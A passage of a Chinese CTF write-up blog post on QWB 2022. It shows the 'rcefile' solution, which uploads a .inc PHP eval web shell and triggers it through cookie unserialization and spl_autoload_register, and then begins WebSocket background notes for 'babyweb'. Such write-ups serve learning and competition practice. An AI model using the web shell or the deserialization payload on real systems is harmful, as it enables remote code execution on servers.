<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="wp 我的队友和我真强  rcefilewww.zip 12345678910111213141516171819202122232425262728293031&#x2F;&#x2F;index,php&lt;?phpinclude &quot;config.inc.php&quot;;$file &#x3D; $_FILES[&quot;file&quot;];if ($file[&quot;error&quot;]">
<meta property="og:type" content="article">
<meta property="og:title" content="qwb2022">
<meta property="og:url" content="http://example.com/2022/07/30/qwb2022/index.html">
<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
<meta property="og:description" content="wp 我的队友和我真强  rcefilewww.zip 12345678910111213141516171819202122232425262728293031&#x2F;&#x2F;index,php&lt;?phpinclude &quot;config.inc.php&quot;;$file &#x3D; $_FILES[&quot;file&quot;];if ($file[&quot;error&quot;]">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220801131740906.png">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220801143146445.png">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220801160044952.png">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220801164022859.png">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220801164411493.png">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220801132739600.png">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220801171434655.png">
<meta property="og:image" content="http://example.com/2022/07/30/qwb2022/image-20220730141152514.png">
<meta property="article:published_time" content="2022-07-30T01:22:57.000Z">
<meta property="article:modified_time" content="2022-08-23T19:13:52.217Z">
<meta property="article:author" content="b1ue0cean">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/30/qwb2022/image-20220801131740906.png">


<link rel="canonical" href="http://example.com/2022/07/30/qwb2022/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/07/30/qwb2022/","path":"2022/07/30/qwb2022/","title":"qwb2022"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>qwb2022 | b1ue0cean's   blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">b1ue0cean's   blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">98</span></a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">77</span></a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">139</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#rcefile"><span class="nav-number">1.</span> <span class="nav-text">rcefile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyweb"><span class="nav-number">2.</span> <span class="nav-text">babyweb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#websocket%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0"><span class="nav-number">2.1.</span> <span class="nav-text">websocket简单学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFwebsocket"><span class="nav-number">2.1.1.</span> <span class="nav-text">什么是websocket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebSocket%E5%92%8CHTTP%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.1.2.</span> <span class="nav-text">WebSocket和HTTP的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebSocket%E7%9A%84%E5%BB%BA%E7%AB%8B"><span class="nav-number">2.1.3.</span> <span class="nav-text">WebSocket的建立</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebSocket%E6%8F%A1%E6%89%8B"><span class="nav-number">2.1.4.</span> <span class="nav-text">WebSocket握手</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebSocket%E7%9A%84%E6%B6%88%E6%81%AF%E4%BD%93%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84"><span class="nav-number">2.1.5.</span> <span class="nav-text">WebSocket的消息体是什么样的</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%93%8D%E6%8E%A7WebSocket"><span class="nav-number">2.2.</span> <span class="nav-text">如何操控WebSocket</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%8B%A6%E6%88%AA%E5%92%8C%E4%BF%AE%E6%94%B9WebSocket%E4%BF%A1%E6%81%AF"><span class="nav-number">2.2.1.</span> <span class="nav-text">1.拦截和修改WebSocket信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%87%8D%E6%94%BE%E5%92%8C%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84WebSocket%E6%B6%88%E6%81%AF"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.重放和生成一个新的WebSocket消息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%93%8D%E6%8E%A7WebSocket%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.操控WebSocket连接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84WebSocket%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="nav-number">2.3.</span> <span class="nav-text">常见的WebSocket漏洞案例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%A8%E7%AB%99WebSocket%E5%8A%AB%E6%8C%81%EF%BC%9F"><span class="nav-number">2.4.</span> <span class="nav-text">1、什么是跨站WebSocket劫持？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%B7%A8%E7%AB%99WebSocket%E5%8A%AB%E6%8C%81%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-number">2.5.</span> <span class="nav-text">2、跨站WebSocket劫持的危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%B8%AA%E8%B7%A8%E7%AB%99WebSocket%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB"><span class="nav-number">2.6.</span> <span class="nav-text">3、如何进行一个跨站WebSocket劫持攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%A8%E7%AB%99WebSockets%E6%94%BB%E5%87%BB"><span class="nav-number">2.7.</span> <span class="nav-text">跨站WebSockets攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E6%8E%A7WebSocket%E6%B6%88%E6%81%AF%E4%BD%93%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.7.1.</span> <span class="nav-text">操控WebSocket消息体寻找漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">2.8.</span> <span class="nav-text">解题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easylogin"><span class="nav-number">3.</span> <span class="nav-text">easylogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyweb"><span class="nav-number">4.</span> <span class="nav-text">easyweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crash"><span class="nav-number">5.</span> <span class="nav-text">crash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WP-UM"><span class="nav-number">6.</span> <span class="nav-text">WP-UM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uploadpro"><span class="nav-number">7.</span> <span class="nav-text">uploadpro</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
      src="/uploads/avatar.jpeg">
  <p class="site-author-name" itemprop="name">b1ue0cean</p>
  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">139</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">77</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">98</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
      </span>
  </div>
  <div class="cc-license site-overview-item animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/30/qwb2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpeg">
      <meta itemprop="name" content="b1ue0cean">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="b1ue0cean's   blog">
      <meta itemprop="description" content="我就是我，人间不一样的烟火">
    </span>
    
    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="qwb2022 | b1ue0cean's   blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          qwb2022
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-30 09:22:57" itemprop="dateCreated datePublished" datetime="2022-07-30T09:22:57+08:00">2022-07-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-08-24 03:13:52" itemprop="dateModified" datetime="2022-08-24T03:13:52+08:00">2022-08-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <span id="more"></span>

<p>wp 我的队友和我真强</p>
<p><img src="/2022/07/30/qwb2022/image-20220801131740906.png" alt="image-20220801131740906"></p>
<h2 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h2><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index,php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        <span class="variable">$imgType</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$typeArr</span>[<span class="number">0</span>]== <span class="string">&quot;image&quot;</span> | !<span class="title function_ invoke__">in_array</span>(<span class="variable">$typeArr</span>[<span class="number">1</span>], <span class="variable">$imgType</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>];</span><br><span class="line">        <span class="variable">$filearray</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$filearray</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;extension error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$imgname</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;./&quot;</span>.<span class="variable">$imgname</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$userfile</span>, <span class="variable">$imgname</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;userfile&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$userfile</span>), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>*<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$msg</span> = <span class="title function_ invoke__">e</span>(<span class="string">&quot;file: <span class="subst">&#123;$imgname&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.inc.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$userfile</span> = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]) ? [] : <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/index.php&quot;</span>&gt;Index&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/showfile.php&quot;</span>&gt;files&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>



<p>我们都知道PHP框架如MVC等等 其中框架核心类里面都会有spl_autoload_register 为了高效率的包含文件，如果这里的spl_autoload_register 没有做限制的话 那么当你想new一个test类的时候 spl_autoload_register会自动去当前目录下包含文件名为test.php 或者是test.inc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;userfile&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$userfile</span>), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>*<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<p>所以我们可以上传一个inc文件吗</p>
<p>然后再通过这里的反序列化 是否就可以日了</p>
<p>编写 .inc 文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>稍微改一下文件类型就ok</p>
<p><img src="/2022/07/30/qwb2022/image-20220801143146445.png" alt="image-20220801143146445"></p>
<p>文件名 350937a1b0d7be9d92be7fd716166e1b.inc</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://eci-<span class="number">2</span>zeen87cjclso2wq5edf.cloudeci1.ichunqiu.com/<span class="number">350937</span>a1b0d7be9d92be7fd716166e1b.inc</span><br></pre></td></tr></table></figure>

<p>我现在的目标就是去 new 一个 350937a1b0d7be9d92be7fd716166e1b 类即可</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">32</span>:<span class="string">&quot;350937a1b0d7be9d92be7fd716166e1b &quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/07/30/qwb2022/image-20220801160044952.png" alt="image-20220801160044952" style="zoom:33%;">









<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/</span><br><span class="line">docker run -dit -p &quot;0.0.0.0:pub_port:8888&quot; </span><br><span class="line">http://39.107.137.85:35073</span><br></pre></td></tr></table></figure>

<p>用法</p>
<blockquote>
<p>help: 帮助菜单</p>
<p>changepw: 修改密码<br>示例: changepw 123456</p>
<p>bugreport: 向管理员报告漏洞页面<br>示例: bugreport <a href="http://host:port/login">http://host:port/login</a></p>
</blockquote>
<p>主要就是 websocket 相关的知识 学习一下 </p>
<p>去年就做过一个 websocket 的题 可惜一年前做的 全都忘得差不多了 重新学习一下</p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocket安全问题分析 | 狼组安全团队公开知识库 (wgpsec.org)</a></p>
<h3 id="websocket简单学习"><a href="#websocket简单学习" class="headerlink" title="websocket简单学习"></a>websocket简单学习</h3><h4 id="什么是websocket"><a href="#什么是websocket" class="headerlink" title="什么是websocket"></a>什么是websocket</h4><p>WebSocket是通过HTTP协议发起的一个双向全双工的通信协议。WebSocket协议被广泛用在现代WEB程序中用于数据流的传输和异步通信。</p>
<h4 id="WebSocket和HTTP的区别"><a href="#WebSocket和HTTP的区别" class="headerlink" title="WebSocket和HTTP的区别"></a>WebSocket和HTTP的区别</h4><p>大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于keep-alive的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。</p>
<p>而WebSocket呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个WebSocket互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个WebSocket连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。</p>
<p>因此，基于以上特点，WebSocket通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用WebSocket来传输实时更新的数据。</p>
<h4 id="WebSocket的建立"><a href="#WebSocket的建立" class="headerlink" title="WebSocket的建立"></a>WebSocket的建立</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="type">WebSocket</span>(<span class="string">&quot;wss://normal-website.com/chat&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>wss协议通过TLS连接建立一个WebSocket；ws协议是不经过加密的连接。</p>
</blockquote>
<h4 id="WebSocket握手"><a href="#WebSocket握手" class="headerlink" title="WebSocket握手"></a>WebSocket握手</h4><blockquote>
<p>通过HTTP协议，客户端和服务端进行一个WebSocket握手。</p>
</blockquote>
<p>客户端的握手请求：</p>
<blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>wDqumtseNBJdhkihL6PW7w==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br></pre></td></tr></table></figure>
</blockquote>
<p>如果服务端接受这个连接，它会返回一个WebSocket回复：</p>
